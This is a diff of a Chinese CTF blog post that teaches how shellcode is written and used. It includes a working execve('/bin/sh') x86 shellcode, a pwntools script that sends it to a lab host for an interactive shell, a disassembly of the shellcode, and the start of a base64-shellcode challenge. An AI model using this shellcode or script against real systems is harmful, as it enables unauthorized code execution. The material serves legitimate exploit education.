@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html  lang="zh">
-<head>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
 <title>Shellcode的编写和利用 - Hvnt3r&#39;s Blog</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
@@ -100,20 +100,15 @@
             
             <div class="navbar-start">
                 
-                <a class="navbar-item"
-                href="/">主页</a>
+                <a class="navbar-item" href="/">主页</a>
                 
-                <a class="navbar-item"
-                href="/archives/">归档</a>
+                <a class="navbar-item" href="/archives/">归档</a>
                 
-                <a class="navbar-item"
-                href="/categories/">分类</a>
+                <a class="navbar-item" href="/categories/">分类</a>
                 
-                <a class="navbar-item"
-                href="/tags/">标签</a>
+                <a class="navbar-item" href="/tags/">标签</a>
                 
-                <a class="navbar-item"
-                href="/about/">关于我</a>
+                <a class="navbar-item" href="/about/">关于我</a>
                 
             </div>
             
@@ -177,7 +172,7 @@
         <div class="content">
             <p>在渗透测试和漏洞利用中，<code>Shellcode</code>是一个十分重要的部分，在二进制的安全研究中，<code>Shellcode</code>也充当着十分重要的角色，本文会记录我学习<code>Shellcode</code>的编写和利用原理。</p>
 <h2 id="在程序中嵌入Shellcode并执行"><a href="#在程序中嵌入Shellcode并执行" class="headerlink" title="在程序中嵌入Shellcode并执行"></a>在程序中嵌入Shellcode并执行</h2><p>首先拿一道十分简单的PWN题来演示程序是如何执行<code>Shellcode</code>的</p>
-<p><a href="">文件下载</a></p>
+<p><a href>文件下载</a></p>
 <p>首先，这是一个<code>32</code>位的程序，我把它放到了<code>32</code>位的<code>kali</code>虚拟机中</p>
 <a id="more"></a>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
@@ -187,7 +182,7 @@
 <figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="hljs-number">08048721</span>                 mov     dword ptr [esp], offset format ; <span class="hljs-string">"%d ... 0x%08x\n"</span></span><br><span class="line">.text:<span class="hljs-number">08048728</span>                 call    _printf</span><br><span class="line">.text:<span class="hljs-number">0804872</span>D                 mov     dword ptr [esp+<span class="hljs-number">8</span>], <span class="hljs-number">20</span>h ; nbytes</span><br><span class="line">.text:<span class="hljs-number">08048735</span>                 mov     eax, [esp+<span class="hljs-number">30</span>h]</span><br><span class="line">.text:<span class="hljs-number">08048739</span>                 mov     [esp+<span class="hljs-number">4</span>], eax    ; buf</span><br><span class="line">.text:<span class="hljs-number">0804873</span>D                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; fd</span><br><span class="line">.text:<span class="hljs-number">08048744</span>                 call    _read</span><br><span class="line">.text:<span class="hljs-number">08048749</span>                 mov     eax, [esp+<span class="hljs-number">30</span>h]</span><br><span class="line">.text:<span class="hljs-number">0804874</span>D                 mov     [esp+<span class="hljs-number">34</span>h], eax</span><br><span class="line">.text:<span class="hljs-number">08048751</span>                 mov     eax, [esp+<span class="hljs-number">34</span>h]</span><br><span class="line">.text:<span class="hljs-number">08048755</span>                 call    eax         &lt;================== Here</span><br><span class="line">.text:<span class="hljs-number">08048757</span>                 mov     [esp+<span class="hljs-number">38</span>h], eax</span><br><span class="line">.text:<span class="hljs-number">0804875B</span>                 lea     eax, [esp+<span class="hljs-number">0</span>C0h+s]</span><br><span class="line">.text:<span class="hljs-number">0804875F</span>                 mov     [esp], eax      ; s</span><br></pre></td></tr></table></figure>
 <p>因此我们可以吧要执行的汇编代码通过<code>pwntools</code>来输入到此程序中达到执行的目的，这里我们要输入的一些能达到某种执行效果的汇编代码即为<code>shellcode</code>，这里有一个网站，上面有很多经典又实用的<code>shellcode</code>，<a href="http://shell-storm.org/" target="_blank" rel="noopener">shell-storm.org</a>，网站的维护者同时是<code>ROPgadget</code>的作者，话不多说，膜就完事了。</p>
 <p>Jonathan Salwan</p>
-<p><img src="https://i.loli.net/2018/10/30/5bd80353472e6.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/30/5bd80353472e6.png" alt></p>
 <p>本程序为用户的输入开启了<code>read(0, v4, 0x20u);</code>即32个字节的空间，因此我们可以在<a href="http://shell-storm.org/shellcode/files/shellcode-841.php" target="_blank" rel="noopener">这个网站</a>上找到一个长度满足要求的shellcode以填充我们的输入：</p>
 <figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] = \</span><br><span class="line"></span><br><span class="line"><span class="hljs-string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"</span></span><br><span class="line"><span class="hljs-string">"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"</span></span><br><span class="line"><span class="hljs-string">"\x80"</span>;</span><br><span class="line"></span><br><span class="line">main ()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// When contains null bytes, printf will show a wrong shellcode length.</span></span><br><span class="line"></span><br><span class="line">	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Shellcode Length:  %d\n"</span>, <span class="hljs-built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">	<span class="hljs-comment">// Pollutes all registers ensuring that the shellcode runs in any circumstance.</span></span><br><span class="line"></span><br><span class="line">	__asm__ (<span class="hljs-string">"movl $0xffffffff, %eax\n\t"</span></span><br><span class="line">		 	 <span class="hljs-string">"movl %eax, %ebx\n\t"</span></span><br><span class="line">			 <span class="hljs-string">"movl %eax, %ecx\n\t"</span></span><br><span class="line">			 <span class="hljs-string">"movl %eax, %edx\n\t"</span></span><br><span class="line">			 <span class="hljs-string">"movl %eax, %esi\n\t"</span></span><br><span class="line">			 <span class="hljs-string">"movl %eax, %edi\n\t"</span></span><br><span class="line">			 <span class="hljs-string">"movl %eax, %ebp\n\t"</span></span><br><span class="line">			 <span class="hljs-comment">// Calling the shellcode</span></span><br><span class="line">			 <span class="hljs-string">"call shellcode"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>shellcode</code>为</p>
@@ -195,12 +190,12 @@
 <p>我们可以直接使用<code>pwntools</code>攻击一下此程序，脚本如下：</p>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">io=remote(<span class="hljs-string">'192.168.229.140'</span>,<span class="hljs-number">10001</span>)</span><br><span class="line">shellcode=<span class="hljs-string">'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'</span></span><br><span class="line"><span class="hljs-keyword">print</span> io.recv()</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p>运行程序即可执行<code>/bin/sh</code>进行远程交互，为了搞清楚这一段shellcode做了什么，我们需要将这一段shell code转换为汇编代码，将shellcode转换为汇编的方式有很多种，我这里使用的方法是用Ollydbg转换，首先，随便用OD打开一个二进制文件，随后复制shellcode的内容，再随意选中OD中汇编框中长度足够的区域，点击右键，选择二进制粘贴，把shellcode粘贴到文件中：</p>
-<p><img src="https://i.loli.net/2018/10/30/5bd8184c49fd2.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/30/5bd8184c49fd2.png" alt></p>
 <p>此时OD会自动把shellcode对应的数据转化为汇编代码：</p>
 <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">31C9            xor ecx,ecx</span><br><span class="line">F7E1            mul ecx</span><br><span class="line">B0 0B           mov al,0xB</span><br><span class="line">51              push ecx</span><br><span class="line">68 2F2F7368     push 0x68732F2F</span><br><span class="line">68 2F62696E     push 0x6E69622F</span><br><span class="line">89E3            mov ebx,esp</span><br><span class="line">CD 80           int 0x80</span><br></pre></td></tr></table></figure>
 <p>可见，这一段<code>shell code</code>调用了系统软中断，相关的详细信息在我之前的博文中有介绍：<a href="https://hvnt3r.top/2018/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8BROP/#%E6%97%A0system%E5%87%BD%E6%95%B0%E6%97%B6%E8%B0%83%E7%94%A8int-0x80%E5%AE%8C%E6%88%90ROP">通过int 80h执行系统命令</a>，这段<code>shellcode</code>就是设置好了调用系统函数的参数并调用的。</p>
 <h2 id="Shellcode变形"><a href="#Shellcode变形" class="headerlink" title="Shellcode变形"></a>Shellcode变形</h2><p>当然百分之99的情况下程序并不会像上面那个例子直接执行用户所给的代码，在<code>BSides San Francisco CTF 2017</code>的<code>b_64_b_tuff</code>中</p>
-<p><a href="">文件下载</a></p>
+<p><a href>文件下载</a></p>
 <p>用IDA查看主要的逻辑：</p>
 <figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">char</span> *s; <span class="hljs-comment">// ST2C_4</span></span><br><span class="line">  <span class="hljs-keyword">void</span> *v5; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">ssize_t</span> v7; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="hljs-number">0xA</span>u);</span><br><span class="line">  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  v5 = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x41410000</span>, <span class="hljs-number">0x1558</span>u, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Address of buffer start: %p\n"</span>, v5);</span><br><span class="line">  buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>u);</span><br><span class="line">  v7 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x1000</span>u);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error reading!"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Read %zd bytes!\n"</span>, v7);</span><br><span class="line">  s = (<span class="hljs-keyword">char</span> *)base64_encode((<span class="hljs-keyword">int</span>)buf, v7, v5);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(s);</span><br><span class="line">  ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))v5)();</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>跟上一个例子类似，程序会将用户输入的代码执行，不过区别在于程序会先把用户输入的数据进行<code>base64</code>解码，那么问题来了，进行<code>base64</code>加密的时候只支持<code>英文字母的大小写</code>和<code>+/</code>，但是在<code>shellcode</code>中有很多不可打印的字符，因此我们需要对<code>shellcode</code>进行一定的处理使得<code>shellcode</code>被<code>base64</code>解码后能正常的执行。</p>
@@ -384,36 +379,31 @@
         
         <div class="level is-mobile">
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Github" href="https://github.com/Hvnt3r">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/Hvnt3r">
                 
                 <i class="fab fa-github"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Facebook" href="https://facebook.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Facebook" href="https://facebook.com">
                 
                 <i class="fab fa-facebook"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Twitter" href="https://twitter.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Twitter" href="https://twitter.com">
                 
                 <i class="fab fa-twitter"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Dribbble" href="https://dribbble.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Dribbble" href="https://dribbble.com">
                 
                 <i class="fab fa-dribbble"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="RSS" href="https://hvnt3r.top/atom.xml">
+            <a class="level-item button is-white is-marginless" target="_blank" title="RSS" href="https://hvnt3r.top/atom.xml">
                 
                 <i class="fas fa-rss"></i>
                 
@@ -2326,8 +2316,7 @@
                 </a>
                 <p class="is-size-7">
                 &copy; 2019 Hvnt3r&nbsp;
-                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
-                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                 
                 </p>
             </div>
@@ -2463,7 +2452,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -2490,5 +2479,5 @@ document.addEventListener('DOMContentLoaded', function () {
 <link rel="stylesheet" href="/css/search.css">
 <link rel="stylesheet" href="/css/insight.css">
     
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-koharu"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
